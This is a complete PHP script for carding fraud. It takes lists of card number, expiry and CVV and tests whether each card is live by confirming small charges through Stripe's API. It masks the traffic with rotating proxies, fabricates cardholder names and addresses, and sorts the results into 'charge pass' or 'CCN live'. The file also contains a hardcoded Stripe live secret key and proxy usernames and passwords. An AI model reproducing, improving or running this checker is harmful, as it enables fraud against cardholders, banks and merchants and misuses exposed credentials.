<?php

############DRAGON-MSETER]##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

 

#########################[Functions + Lista]############################

          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];          
                  
           function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

                  $MADEBY = "<a href='tg://user?id=1832970939'>[ 🇮🇳 ] Dragon Master</a>"; /// PUT YOUR NAME

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);
#########################[BIN LOOK-UP]############################

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch); 
                $emoji = GetStr($fim, '"emoji":"', '"'); 
                if(strpos($fim, '"type":"credit"') !== false){
                }
                curl_close($ch);

#########################

          $ch = curl_init();
          $bin = substr($cc, 0,6);
          curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $bindata = curl_exec($ch);
                  $binna = json_decode($bindata,true);
                  $brand = $binna['scheme'];
                  $country = $binna['country']['name'];
                  $type = $binna['type'];
                  $bank = $binna['bank']['name'];
                  curl_close($ch);

                  $bindata1 = " $type - $brand - $country $emoji"; ///CREDIT - MASTERCARD - UNITED STATES 🇺🇸

#########################[Randomizing Details]############################

       $get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country.'');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];

$skArray = array(

    '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', #<-------place you sk here---------->
    'sk_live_',
    'sk_live_',
    'sk_live_',
);

if (isset($skArray)) { 
 $sk = $skArray[array_rand($skArray)]; 
} else {
    echo 'YOU SUCK BRO';
}
######################[Proxys]######################
$rp1 = array(
  1 => 'hirjrlsl-rotate:4t9sojo3ujcq',
  2 => 'hqjqdfsn-rotate:1aytf8vmtr4q',
  3 => 'qxpdtblw-rotate:q2xq6qbe1nu5',
  4 => 'wyoxjxny-rotate:dlimcfeegx49',
  5 => 'fyeeehcw-rotate:wh4y46elxxq1',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live ✅";
}
if (empty($ip1)){
$ip = "Proxy Dead ❌ :[".$rotate."]";
}

 echo '[ IP: '.$ip.' ] ';

//######################[Proxys END]######################//


#########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $socks5); 
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
              $t = curl_exec($ch);
              $tok1 = Getstr($t,'"id": "','"');
              $msg = Getstr($t,'"message": "','"');

#########################[2 REQ]############################


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&payment_method_types[]=card');
$p = curl_exec($ch);
$tok2 = Getstr($p,'"id": "','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
echo $response = curl_exec($ch);
$ns = Getstr($response,'"network_status": "','"');
$rl = Getstr($response,'"risk_level": "','"');
$sm = Getstr($response,'"seller_message": "','"');
$cvccheck = Getstr($response,'"cvc_check": "','"');
#########################[Responses]############################
///// [1REQ - RSOP]

if ($sm == "Payment complete."){
  $status = '#CVV';
  $cc_code = '『 CHARGE PASS✅ 』';
  $reqfind = '1 Req';
}
elseif ($sm == "The bank returned the decline code `incorrect_cvc`."){
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}
elseif ($sm == "incorrect_cvc") {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

 

//=======================[Responses-END]==============================//

    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.'Request By :- '.$reqfind.' [STRIPE] </br>';


curl_close($ch);
ob_flush();

############DRAGON-MSETER]##########

?> 